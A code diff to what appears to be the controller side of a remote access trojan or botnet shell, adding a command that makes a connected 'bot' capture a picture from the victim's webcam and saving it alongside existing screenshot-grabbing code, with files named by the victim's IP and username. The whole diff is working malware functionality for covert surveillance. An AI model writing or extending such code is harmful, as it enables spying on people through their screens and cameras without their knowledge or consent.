@@ -4,6 +4,7 @@
 
 # Written By Ananke: https://github.com/4n4nk3
 import sys
+
 sys.path.append('./modules/')
 import datetime
 import os
@@ -210,7 +211,35 @@ def screenshot() -> bool:
     if received_file_data != 'reachedexcept':
         counter = 0
         while True:
-            local_filename = 'screenshot-{}-{}-{}.png'.format(connected_sockets[active_bot]['ip'], connected_sockets[active_bot]['username'], str(counter))
+            local_filename = 'screenshot-{}-{}-{}.png'.format(connected_sockets[active_bot]['ip'],
+                                                              connected_sockets[active_bot]['username'], str(counter))
+            if not os.path.isfile(local_filename):
+                break
+            counter += 1
+        try:
+            downloaded_file_descriptor = open(local_filename, 'wb')
+            downloaded_file_descriptor.write(received_file_data)
+            downloaded_file_descriptor.close()
+            logging(data_to_log=('Screenshot saved as ' + local_filename + '\n'), printer=True)
+        except Exception as exception_downloader:
+            logging(data_to_log=str(exception_downloader), printer=True)
+    else:
+        remote_exception = receiver()
+        logging(
+            data_to_log='Operation aborted (received <reachedexcept> string from bot)\nDetails: ' + remote_exception,
+            printer=True)
+    return True
+
+
+def webcam_pic() -> bool:
+    """Take a full screen screenshot from the bot.\n"""
+    sender('SHwebcampic')
+    received_file_data = b64decode(receiver())
+    if received_file_data != 'reachedexcept':
+        counter = 0
+        while True:
+            local_filename = 'webcam-pic-{}-{}-{}.png'.format(connected_sockets[active_bot]['ip'],
+                                                              connected_sockets[active_bot]['username'], str(counter))
             if not os.path.isfile(local_filename):
                 break
             counter += 1
@@ -487,6 +516,12 @@ class TinkererShellInput(cmd.Cmd):
     def do_SHscreenshot(self, option):
         """SHscreenshot\n\tGrab a screenshot of the whole screen (multiple monitors supported)\n"""
         screenshot()
+
+    # ---------------------------------------------------------------------------------------------
+    # noinspection PyUnusedLocal
+    def do_SHwebcampic(self, option):
+        """SHwebcampic\n\tGrab a picture using the webcam of the remote host\n"""
+        webcam_pic()
 
     # ---------------------------------------------------------------------------------------------
     # noinspection PyUnusedLocal
